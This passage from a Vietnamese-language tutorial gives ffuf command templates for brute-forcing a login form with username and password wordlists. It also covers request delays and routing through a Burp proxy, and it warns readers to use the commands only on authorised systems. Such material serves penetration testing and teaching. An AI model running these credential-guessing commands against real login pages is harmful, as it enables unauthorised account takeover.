ffuf -w users.txt:USER -w passes.txt:PASS \
     -X POST \
     -d "username=USER&password=PASS" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login \
     -fc 401 \
     -p 0.5
```

- `-p 0.5` : chờ 0.5 giây giữa mỗi request.

---

## 7. Sử dụng proxy để quan sát request (debug)

Thêm `-x http://127.0.0.1:8080` để gửi request qua Burp Suite:

```bash
ffuf -w users.txt:USER -w passes.txt:PASS \
     -X POST \
     -d "username=USER&password=PASS" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login \
     -fc 401 \
     -x http://127.0.0.1:8080
```

---

## Lưu ý quan trọng

- **Chỉ sử dụng trên hệ thống bạn có quyền kiểm tra.**
- Nên dùng wordlist phù hợp (vd: SecLists).
- Nếu server trả về quá nhiều response giống nhau, hãy phân tích kỹ response thành công (có thể chứa chuỗi đặc biệt) rồi dùng `-mr` (match regex) thay vì filter.
- Nếu form có thêm field ẩn, hãy kiểm tra source HTML và thêm vào `-d`.

---

Hy vọng các template trên giúp bạn bắt đầu brute force login bằng ffuf hiệu quả. Nếu cần tùy chỉnh thêm, hãy tham khảo tài liệu chính thức: `ffuf -h`.

</div>

---

